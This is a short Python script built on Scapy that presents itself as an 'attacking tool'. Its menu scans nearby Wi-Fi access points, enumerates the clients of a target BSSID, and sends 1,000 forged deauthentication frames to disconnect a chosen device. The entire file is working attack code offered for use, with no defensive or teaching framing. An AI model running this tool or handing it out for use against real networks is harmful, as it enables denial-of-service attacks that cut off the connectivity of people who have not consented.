from scapy.all import *
from threading import Thread
import pandas
import time
import os

clients_set = {""}

# initialize the networks dataframe that will contain all access points nearby
networks = pandas.DataFrame(columns=["BSSID", "SSID", "dBm_Signal", "Channel", "Crypto"])
# set the index BSSID (MAC address of the AP)
networks.set_index("BSSID", inplace=True)

interface = input("  Please enter your monitor device \n")
target_bssid = ""

def callback(packet):

    if packet.haslayer(Dot11Beacon):
        bssid = packet[Dot11].addr2
        ssid = packet[Dot11Elt].info.decode()
        try:
            dbm_signal = packet.dBm_AntSignal
        except:
            dbm_signal = "N/A"

        stats = packet[Dot11Beacon].network_stats()
        channel = stats.get("channel")
        crypto = stats.get("crypto")
        networks.loc[bssid] = (ssid, dbm_signal, channel, crypto)


def change_channel():
    ch = 1
    while True:
        os.system(f"iwconfig {interface} channel {ch}")
        ch = ch % 14 + 1
        time.sleep(0.5)


def getClients(packet):
    bssid = packet[Dot11].addr3
    dest = packet[Dot11].addr2
    src = packet[Dot11].addr1
    if target_bssid == src:
        clients_set.add(dest)
                           

def deauth():
    AP_MAC = input("Please enter AP MAC \n")
    AP_MAC = AP_MAC.lower()
    DEV_MAC = input("PLease enter Clients to disconnect \n")
    DEV_MAC = DEV_MAC.lower()

    packet = RadioTap() / Dot11(type = 0 , subtype = 12 , addr1 = DEV_MAC , addr2 = AP_MAC , addr3 = AP_MAC ) / Dot11Deauth(reason = 7)
    sendp(packet,iface= interface ,count=1000,inter=0.1)
        
def scan_wifi():
    print("Scanning ........")
    sniff(prn=callback, iface=interface,timeout=60)
    print(networks)
   
def scan_clients():
    global target_bssid
    target_bssid = input("\t Enter target bssid \n")
    target_bssid = target_bssid.lower()
    print(f"scanning for clients on {target_bssid}")
    #target_bssid = input("Enter target bssid \n")
    sniff(iface=interface, prn=getClients, timeout=50)
    print_clients(clients_set)

def print_clients(clients_set):
    print()
    print("BSSID")
    for c in clients_set:
        if c == "00:00:00:00:00:00" or c == '' or c == "ff:ff:ff:ff:ff:ff":
            continue
        else:
            print(c)
    print()



def switch_channels():
    channel_changer = Thread(target=change_channel)
    channel_changer.daemon = True
    channel_changer.start()


def print_menu():
    print("*******************************************")
    print("\t For WIFI Scanning press 1")
    print("\t For clients on WIFI press 2")
    print("\t For deauth press 3")
    print("\t Type q for exit")
    
def menu():
    print("\t Welcome to our attacking tool")
    print_menu()
    choice = input("\n")
    while True:
        switch_channels()

        if choice == "1":
            scan_wifi()
        elif choice == "2":
            scan_clients()
        elif choice == "3":
            deauth()
        elif choice == "q":
            break
        print_menu()
        choice = input("\n")

      


if __name__ == "__main__":
    menu()


